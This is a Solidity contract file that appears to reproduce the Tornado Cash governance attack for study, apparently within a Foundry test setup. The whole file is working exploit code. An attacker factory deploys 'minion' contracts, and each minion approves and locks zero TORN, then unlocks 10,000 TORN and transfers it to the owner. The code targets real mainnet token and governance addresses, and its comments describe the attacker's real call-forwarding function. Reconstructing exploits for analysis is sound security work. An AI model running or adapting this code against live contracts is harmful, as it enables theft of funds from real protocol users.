// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Ownable} from "./AttackerOwnable.sol";
import "./TornadoGovernance.interface.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import "forge-std/Test.sol";

// Contracts deployed and operated by the attacker 1
// The attacker 2 wrote the lockedBalances for each minion deployed by the attacker 1 through this factory

// No cheatcodes are used for best representation of reality. Only logs.
contract Attacker1Contract {
    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    address[] internal _minionContracts;

    function getMinions() public view returns (address[] memory) {
        return _minionContracts;
    }

    function deployMultipleContracts(uint256 amount) external {
        address newMinion;
        for (uint256 i = 0; i < amount;) {
            newMinion = address(new Attacker1Minion(msg.sender));
            console2.log("Deploying and preparing minion #%s at address: %s", i + 1, newMinion);

            _minionContracts.push(newMinion);

            // The following steps were performed by the attacker but are not necessary for the attack
            // The attack works if the next lines are commented.
            tornToken.transferFrom(msg.sender, newMinion, 0);
            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.LOCK);

            unchecked {
                ++i;
            }
        }
    }

    function triggerUnlock() external {
        uint256 amountOfMinions = _minionContracts.length;
        for (uint256 i = 0; i < amountOfMinions;) {
            address currentMinion = _minionContracts[i];
            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.UNLOCK);
            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.TRANSFER);

            unchecked {
                ++i;
            }
        }
    }
}

// Each minion implementation
contract Attacker1Minion {
    enum AttackInstruction {
        APPROVE,
        LOCK,
        UNLOCK,
        TRANSFER
    }

    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);

    address owner;

    constructor(address _owner) {
        owner = _owner;
    }

    // this function has the signature 0x93d3a7b6 on each minion contract
    // The attacker implemented this method so it uses target.call(payload) and had two parameters:
    // something like: 0x93d3a7b6(address target, bytes memory payload);
    /*

    function 0x93d3a7b6(address target, bytes memory payload) external {
        (bool success, ) = target.call(payload);
        require(success);
    }

    */
    // We show this implementation to show each step clearly
    function attackTornado(AttackInstruction instruction) external {
        if (instruction == AttackInstruction.APPROVE) {
            tornToken.approve(address(TORNADO_GOVERNANCE), 0);
        } else if (instruction == AttackInstruction.LOCK) {
            TORNADO_GOVERNANCE.lockWithApproval(0);
        } else if (instruction == AttackInstruction.UNLOCK) {
            TORNADO_GOVERNANCE.unlock(10_000 ether); // 10000000000000000000000
        } else if (instruction == AttackInstruction.TRANSFER) {
            tornToken.transfer(owner, 10_000 ether);
        }
    }
}
